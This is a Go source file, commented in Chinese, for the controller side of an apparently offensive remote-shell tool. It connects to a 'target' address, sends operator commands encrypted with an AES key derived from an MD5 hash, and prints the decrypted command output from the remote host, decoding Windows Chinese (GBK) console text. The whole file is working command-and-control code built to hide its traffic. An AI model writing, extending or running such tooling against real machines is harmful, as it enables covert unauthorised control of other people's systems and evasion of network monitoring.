package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	aesplug "golang.com/golang.com/aesPlug"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func main() {
	//检查用户参数，并获取参数
	var ipAddr string
	if len(os.Args) != 3 {
		fmt.Println(`Usage:go run .\main.go 127.0.0.1:9999 aeskey`)
		os.Exit(1) //0表示正常退出，其他表示异常
	}
	ipAddr = os.Args[1]
	initAesKey := os.Args[2]
	newAesKey := hashMD5(initAesKey)

	//发起TCP请求
	conn, err := net.Dial("tcp", ipAddr)
	if err != nil {
		log.Fatal("Failed to connect to target", err)
	}

	//读取conn对端发送过来的信息
	go shellHandle(conn, newAesKey)

	//扫描用户的标准输入
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text()
		if strings.TrimSpace(command) == "exit" {
			fmt.Println("Client exiting...")
			break
		}
		aes_Command := aesplug.EncryptAES([]byte(newAesKey), command)

		_, err := fmt.Fprintln(conn, aes_Command)
		if err != nil {
			fmt.Println("Command sending failed")
		}
	}
}

func hashMD5(input string) string {
	// 创建一个MD5哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write([]byte(input))

	// 计算MD5散列值
	hash := hasher.Sum(nil)

	// 将散列值转换为十六进制字符串并返回
	hashString := hex.EncodeToString(hash)
	return hashString
}

// shellHandle读取输出
func shellHandle(conn net.Conn, newAesKey string) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		//result解密
		ciphertext := scanner.Text()
		//fmt.Println(ciphertext)
		plaintext := aesplug.DecryptAES([]byte(newAesKey), ciphertext)

		result, err := convertToUTF8([]byte(plaintext))
		if err != nil {
			fmt.Println("Error converting to UTF-8:", err)
		}
		fmt.Println(result)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from server:", err)
	}
}

// convertToUTF8处理输出中文字符时的编码问题
func convertToUTF8(input []byte) (string, error) {
	// 这里使用GBK作为输入的字符编码，你可以根据实际情况调整
	output, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(input))
	if err != nil {
		return "", err
	}
	return output, nil
}
